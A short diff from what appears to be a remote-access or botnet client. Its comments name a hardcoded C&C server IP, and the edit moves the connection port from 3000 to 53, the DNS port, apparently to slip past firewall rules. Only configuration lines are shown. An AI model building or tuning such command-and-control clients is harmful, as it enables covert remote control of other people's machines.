@@ -16,7 +16,7 @@ class client:
     # ip address of our C&C server, can be changed depending on what ip server is located
     host = '18.205.103.236'
     # port of the server to connect to, can be changed depending on what port server is listening at
-    port = 3000
+    port = 53 #3000
 
     BUFFER_SIZE = 20480
 
